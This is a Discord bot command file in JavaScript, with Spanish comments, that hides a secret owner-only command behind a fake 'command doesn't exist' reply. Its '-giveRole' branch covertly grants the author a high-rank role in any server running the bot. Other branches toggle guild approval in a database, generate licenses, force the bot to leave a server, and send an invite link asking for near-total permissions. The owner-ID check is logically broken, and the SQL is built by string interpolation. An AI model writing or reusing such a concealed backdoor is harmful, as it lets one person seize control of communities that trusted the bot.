exports.run = async (client, message, args) => { 
    message.delete();
    
    if (message.author.id != 344543506481807363 || message.author.id != '344543506481807363'){ 
        return util.unkred("Lo sentimos ese comando no existe", 5000)
    };
    
    var cmdActive = false;
    var user = message.author.id;

    try {
        //message.author.send(`Que bueno tenerte de vuelta <@${message.author.id}>`);
        cmdActive = true;
        client.on("message", (message) => {
            if (message.author.id == user) {
                try{ 
                    
                    // USO EXCLUSIVO PARA EMERGENCIAS // 
                    if (message.content.startsWith("-giveRole") && cmdActive == true ) {               
                        message.delete();
                        let miembro = message.member;
                        let role = message.guild.roles.find("name", `${config.highrank}`);          
                        if(!role) return message.author.send(`No encontre ese rol en el servidor  ${config.svname}.`);
                        miembro.addRole(role).catch(console.error); 
                        cmdActive = false                                                             
                    }
                    
                    // Otorgarle permisos a un servidor
                    else if(message.content.startsWith("-aproveThisGuild") && cmdActive == true) {
                        message.delete()
                        MySQL.query(`SELECT aproved FROM servers WHERE guild = ${message.guild.id}`, (err, result) => {
                            if(result[0] == undefined){
                                MySQL.query(`INSERT INTO servers (guild, aproved) VALUES (${message.guild.id}, 1)`, () => {
                                    util.unkgreen("Este server se configuro en la base de datos y se le dio acceso a mis comandos", 5000) 
                                }); 
                            }else if(result[0] != undefined && result[0].aproved == 0) {
                                MySQL.query(`UPDATE servers SET aproved = 1 WHERE guild = ${message.guild.id}`, () => {
                                    util.unkgreen("Este server ahora tiene acceso a mis comandos", 5000)  
                                });
                            }else if(result[0] != undefined && result[0].aproved == 1) {
                                util.unkblue("Este server ya tenia acceso a mis comandos", 5000)  
                            }else if(err){
                                return console.log(err);
                            }
                        });
                        cmdActive = false; 
                    }
                    
                    // Removerle el permiso a un servidor
                    else if(message.content.startsWith("-removeAproved") && cmdActive == true) {
                        message.delete()
                        MySQL.query(`SELECT aproved FROM servers WHERE guild = ${message.guild.id}`, (err, result) => {
                            if(result[0] == undefined){
                                MySQL.query(`INSERT INTO servers (guild) VALUES (${message.guild.id})`, () => {
                                    util.unkyellow("Este server se configuro en la base de datos y no se le dio acceso a mis comandos", 5000) 
                                }); 
                            }else if(result[0] != undefined && result[0].aproved == 0) {
                                util.unkblue("Este server no estaba aprobado", 5000)  
                                
                            }else if(result[0] != undefined && result[0].aproved == 1) {
                                MySQL.query(`UPDATE servers SET aproved = 0 WHERE guild = ${message.guild.id}`, () => {
                                    util.unkgreen("Este server ya no tiene acceso a mis comandos", 5000)  
                                });
                            }else if(err){
                                return console.log(err);
                            }
                        });
                        cmdActive = false; 
                    }
                    
                    // Funcion para generar licencias (requiere del archivo licenseGenerator.js)
                    else if(message.content.startsWith("-GenerateLicenses") && cmdActive == true) {
                        message.delete()
                        
                        var args = message.content.slice(17);

                        if(args == "" || args == " ") {
                            return util.unkred("Debes ingresar la cantidad de licencias a Generar", 5000);
                        }
                        
                        if(isNaN(args)) {
                            return util.unkred("Debes ingresar una cantidad valida de licencias a Generar", 7000);
                        }

                        util.unkyellow(`Generando ${args} licencias`, 3500)

                        let generate = require('../modules/licenseGenerator');
                        var licenses = generate(args);
                        
                        message.author.send("Las licencias generadas son:") 
                        message.author.send(licenses) 

                        cmdActive = false; 
                    }
                    
                    // Funcion que hace que el bot abandone un servidor 
                    else if(message.content.startsWith("-leftGuild") && cmdActive == true){
                        message.delete();
                        console.log(message.author)
                        message.member.guild.leave();
                        cmdActive = false;
                    }
                    
                    // Que te mande el link para meter el bot a un server 
                    else if(message.content.startsWith("-botLink") && cmdActive == true){
                        message.delete();
                        message.author.send("https://discordapp.com/oauth2/authorize?client_id=613748403616350211&scope=bot&permissions=2146958847");
                        cmdActive = false;
                    }

                }catch(err){
                    console.log(err)
                }
            }
        });  
    }catch(err){
        console.log(err)
    }

}